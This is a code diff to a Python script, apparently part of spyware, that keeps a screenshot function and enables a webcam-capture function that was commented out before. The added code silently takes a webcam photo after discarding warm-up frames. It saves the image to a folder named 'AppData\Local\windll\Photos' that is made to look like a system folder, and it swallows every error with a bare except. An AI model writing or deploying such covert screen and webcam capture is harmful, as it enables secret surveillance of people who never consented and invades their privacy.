@@ -11,7 +11,7 @@
 #-----------------------------------------------------------------------------#
 from PIL import ImageGrab
 from os import environ,sep
-# import cv2
+import cv2
 
 def Screenshot():
 	try:
@@ -21,19 +21,15 @@ def Screenshot():
 		print("screen")
 	except Exception as e:
 		print(e)
-'''
-def WebCam():
+
+def WebCam(): 
 	try:
-		try:
-			pathtofolder = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
-			cam = cv2.VideoCapture(0)
-			cam.set(cv2.CAP_PROP_FRAME_WIDTH, 1920)
-			cam.set(cv2.CAP_PROP_FRAME_HEIGHT, 1080)
-			ret, frame = cam.read()
-			cv2.imwrite(rf'{pathtofolder}\windll\Photos\webcam.png',frame)
-			cam.release()
-		except Exception as e:
-			print(e)
-	except Exception as e:
-		print(e)
-'''
+		pathtofolder = environ['USERPROFILE'] + sep + r'AppData\Local'
+		cap = cv2.VideoCapture(0)
+		for i in range(30):
+			cap.read()
+		ret, frame = cap.read()
+		cv2.imwrite(pathtofolder+'\\windll\\Photos\\webcam.png', frame)   
+		cap.release()
+	except:
+	    pass
